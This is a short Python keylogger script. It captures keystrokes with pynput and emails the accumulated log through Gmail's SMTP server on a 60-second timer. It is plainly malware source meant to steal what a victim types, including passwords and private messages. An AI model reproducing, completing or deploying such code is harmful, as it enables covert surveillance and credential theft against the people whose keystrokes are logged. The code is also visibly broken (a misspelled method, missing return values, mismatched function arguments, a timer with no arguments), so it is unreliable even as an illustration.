import pynput.keyboard
import smtplib
import threading
import optparse

log = ""

def user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-g", "--gmail", dest="gmail_address", help="Enter Your Gmail Address: ")


def callback_function(key):
    global log
    try:
        log = log + key.char.enccode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

    print(log)

def send_email(gmail,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(gmail, password)
    email_server.sendmail(gmail, gmail, message)
    email_server.quit()

def thread_function(gmail,password):
    global log
    send_email(gmail, password, log)
    log = ""
    timer_object = threading.Timer(60, thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()


user_gmail_address = user_input()
thread_function(user_gmail_address)